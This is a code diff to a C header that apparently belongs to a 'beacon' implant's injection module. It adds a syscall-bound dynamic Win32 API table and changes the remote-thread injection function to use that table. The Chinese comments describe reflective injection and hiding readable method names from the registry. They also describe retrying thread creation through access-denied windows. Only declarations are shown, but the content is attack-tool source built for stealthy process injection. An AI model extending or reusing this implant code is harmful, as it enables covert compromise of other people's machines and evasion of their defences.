@@ -1,6 +1,7 @@
 #pragma once
 
 #include "beacon_common.h"
+#include "beacon_api.h"
 
 /* 注入方法 ID：只保留数值标识，避免在注册表中引入可读方法名。 */
 #define INJECT_METHOD_REFLECTIVE 1u
@@ -18,6 +19,7 @@ typedef struct InjectRequest {
     const CHAR* parameter_label;
     const CHAR* invalid_request_error;
     const CHAR* missing_export_error;
+    const Win32Api* api;             /* 动态 API 表（syscall 绑定后的槽位） */
 } InjectRequest;
 
 /* 注入准备结果：记录远程映像、远程参数块和最终线程入口地址。 */
@@ -84,7 +86,8 @@ BOOL InjectRemoteProcessAlive(HANDLE process,
                               SIZE_T status_size);
 
 /* 创建远程线程；可配置重试次数，用于兼容短暂 ACCESS_DENIED 窗口。 */
-BOOL InjectCreateRemoteThread(HANDLE process,
+BOOL InjectCreateRemoteThread(const Win32Api* api,
+                              HANDLE process,
                               PVOID remote_entry,
                               PVOID thread_parameter,
                               UINT32 attempts,
